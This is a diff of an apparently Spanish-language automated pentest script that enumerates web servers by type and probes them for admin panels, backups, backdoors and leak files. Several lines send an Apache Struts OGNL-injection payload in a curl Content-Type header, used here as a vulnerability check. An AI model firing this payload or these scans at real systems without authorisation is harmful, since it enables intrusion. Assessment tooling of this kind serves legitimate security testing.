-					curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$ip:$port/" > logs/vulnerabilidades/$ip-$port-apacheStruts.txt 2>/dev/null
-					cp logs/vulnerabilidades/$ip-$port-apacheStruts.txt .vulnerabilidades/$ip-$port-apacheStruts.txt 
+					curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$ip:$port/" > logs/vulnerabilidades/$ip-$port-apacheStruts.txt 2>/dev/null					
+					grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/$ip-$port-apacheStruts.txt > .vulnerabilidades/$ip-$port-apacheStruts.txt
 					
-					echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
-					web-buster.pl -t $ip -p $port -h 5 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &			
-					web-buster.pl -t $ip -p $port -h 5 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &										
+					echo -e "\t[+] Revisando directorios comunes ($ip -Tomcat)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &			
+					sleep 2
+					echo -e "\t[+] Revisando archivos comunes de tomcat ($ip -Tomcat)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$ip-$port-webarchivos.txt 
+					sleep 2
+					echo -e "\t[+] Revisando archivos comunes de servidor ($ip -Tomcat)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt
 					sleep 1										
 				fi
 										
@@ -1930,7 +1939,7 @@ then
 		
 		
 				#######  if the server is apache ######
-				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
+				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
 				greprc=$?
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 												
@@ -1944,20 +1953,29 @@ then
 					#nmap -n -p $port $ip --script=http-vuln-cve2012-1823 >> logs/vulnerabilidades/$ip-$port-cgi.txt 2>/dev/null 
 					#grep "|" logs/vulnerabilidades/$ip-$port-cgi.txt > .vulnerabilidades/$ip-$port-cgi.txt  	
 												
-					echo -e "\t[+] Revisando directorios y archivos comunes (Apache)"
-					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando directorios comunes ($ip -Apache/nginx)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					sleep 2	
+					echo -e "\t[+] Revisando paneles administrativos ($ip -Apache/nginx)"				
+					web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando archivos comunes de servidor ($ip -Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt 
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando backups de archivos de configuración ($ip -Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  &
+					echo -e "\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m archivosPeligrosos -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-archivosPeligrosos.txt  &
+					echo -e "\t[+] Revisando archivos peligrosos ($ip -Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m archivosPeligrosos -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-archivosPeligrosos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorApache -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-backdoor.txt  &
+					echo -e "\t[+] Revisando la existencia de backdoors ($ip -Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorApache -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-backdoor.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 2 -d / -m phpinfo -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$ip-$port-phpinfo.txt 2>/dev/null &
+					echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip -Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m divulgacionInformacion -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$ip-$port-divulgacionInformacion.txt 2>/dev/null 
 																		
 				fi						
 				####################################						
@@ -2014,7 +2032,7 @@ then
 			python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1)) 
 			script_instancias=$((perl_instancias + python_instancias))
 			
-			if [[ $free_ram -gt $min_ram && $script_instancias -lt 80  ]];then 
+			if [[ $free_ram -gt $min_ram && $script_instancias -lt 20  ]];then 
 				echo -e "[+] Escaneando $ip:$port"
 				echo -e "\t[+] Obteniendo información web"
 				webData.pl -t $ip -p $port -s 1 -e todo -d / -l logs/enumeracion/$ip-$port-webData.txt -r 4 > .enumeracion/$ip-$port-webData.txt 2>/dev/null  &			
@@ -2064,7 +2082,7 @@ then
 		while true; do
 				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 				perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
-				if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 				
+				if [[ $free_ram -gt $min_ram && $perl_instancias -lt 20  ]];then 				
 				
 				######## revisar por dominio #######
 				if grep -q "," "$prefijo$FILE" 2>/dev/null; then
@@ -2076,44 +2094,62 @@ then
 						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy							
 							curl --insecure --max-time 2 https://$subdominio:$port/nonexist123  > logs/enumeracion/$subdominio-$port-debugHabilitado.txt 2>/dev/null
 							egrep -i  --color=never "Django|laravel" logs/enumeracion/$subdominio-$port-debugHabilitado.txt > .enumeracion/$subdominio-$port-debugHabilitado.txt
+							
 							###  if the server is apache ######
-							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
+							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 												
-								echo -e "\t[+] Revisando directorios y archivos comunes ($subdominio - Apache)"
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &								
+								echo -e "\t[+] Revisando directorios comunes ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &								
+								sleep 2								
+								echo -e "\t[+] Revisando paneles administrativos ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &								
 								sleep 2
-								web-buster.pl -t $subdominio  -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt 
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt 
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/$subdominio-$port-webarchivos.txt
+								echo -e "\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/$subdominio-$port-webarchivos.txt
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-archivosPeligrosos.txt  &
+								echo -e "\t[+] Revisando archivos peligrosos ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-archivosPeligrosos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
+								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-backdoor.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 2 -d / -m phpinfo -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$subdominio-$port-phpinfo.txt 2>/dev/null &
+								echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m divulgacionInformacion -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$subdominio-$port-divulgacionInformacion.txt 2>/dev/null 
 							fi						
 							####################################	
 							
 							#######  if the server is IIS ######
-							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga"  # no redirecciona
+							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
-								echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando directorios ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt &
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
+								echo -e "\t[+] Revisando paneles administrativos ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt &
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
+								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando archivos de sharepoint ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorsIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
+								echo -e "\t[+] Revisando archivos de webservices ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
+								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorsIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  
+								sleep 2
+								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  
 								sleep 2										   
 							fi
 										
@@ -2127,9 +2163,14 @@ then
 								echo -e "\t[+] Revisando Apache struts"
 								curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$subdominio:$port/" > .vulnerabilidades/$subdominio-$port-apacheStruts.txt  2>/dev/null
 								
-								echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
-								web-buster.pl -t $subdominio -p $port -h 5 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
-								web-buster.pl -t $subdominio -p $port -h 5 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &										
+								echo -e "\t[+] Revisando directorios y archivos comunes ($subdominio - Tomcat)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								sleep 2
+								echo -e "\t[+] Revisando archivos comunes de tomcat ($subdominio - Tomcat)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  
+								sleep 2
+								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  							
 								sleep 1										
 							fi
 										
@@ -2185,7 +2226,7 @@ then
 								if [ -d "$subdominio" ]; then
 									echo -e "\t\t[+] Ya clonamos este sitio"
 								else
-									wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate https://$subdominio
+									wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate https://$subdominio
 									rm index.html.orig 2>/dev/null
 								fi
 								
@@ -2196,24 +2237,6 @@ then
 						fi														
 						
 					done # subdominios 
-					
-				 cd webClone
-					echo -e "\t\t[+] Extrayendo URLs"
-					grep --color=never -irao "http://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt
-					lines=`wc -l http.txt  | cut -d " " -f1`
-					perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
-					paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt
-					rm http.txt
-					
-					grep --color=never -irao "https://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt
-					lines=`wc -l https.txt  | cut -d " " -f1`
-					perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
-					paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt
-					rm https.txt
-				 
-					#grep --color=never -irao "http://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/$DOMAIN-web-wget2.txt
-					#grep --color=never -irao "https://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/$DOMAIN-web-wget2.txt
-				cd ../								
 			  fi # revisar por dominio
 				################################
 								
@@ -2265,47 +2288,64 @@ then
 					
 																							
 				#######  if the server is apache ######
-				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
+				egrep -i "apache|nginx" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
 				greprc=$?				
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes
 					
-					echo -e "\t[+] Revisando directorios y archivos comunes (Apache)"
-					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando directorios ( $ip Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando  paneles administrativos ( $ip Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando archivos comunes de servidor ($ip - Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  &
+					echo -e "\t[+] Revisando backups de archivos de configuración ($ip - Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-archivosPeligrosos.txt  &
+					echo -e "\t[+] Revisando archivos CGI ($ip - Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-backdoor.txt  &
+					echo -e "\t[+] Revisando archivos peligrosos ($ip - Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-archivosPeligrosos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 2 -d / -m phpinfo -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$ip-$port-phpinfo.txt 2>/dev/null &	
+					echo -e "\t[+] Revisando la existencia de backdoors ($ip - Apache/nginx)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-backdoor.txt  
+					sleep 2
+					echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip - Apache/nginx)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m divulgacionInformacion -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$ip-$port-divulgacionInformacion.txt 2>/dev/null 
 				fi						
 				####################################
 		
 				#######  if the server is IIS ######
-				grep -qi IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" 
+				grep -qi IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" 
 				greprc=$?
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes					
 					echo -e "\n### $ip:$port ( IIS - HTTPsys)"
 					nmap -n -Pn -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
 					grep "|" logs/vulnerabilidades/$ip-$port-HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-$port-HTTPsys.txt 
 					
-					echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
-					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando directorios  (IIS)"					
+					web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &	
+					echo -e "\t[+] Revisando paneles administrativos ($ip - IIS)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &	
+					echo -e "\t[+] Revisando archivos comunes de servidor ($ip - IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando archivos comunes de sharepoint ($ip - IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorsIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &
+					echo -e "\t[+] Revisando archivos comunes de webservices ($ip - IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt 
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &											
+					echo -e "\t[+] Revisando la existencia de backdoors ($ip - IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorsIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt 
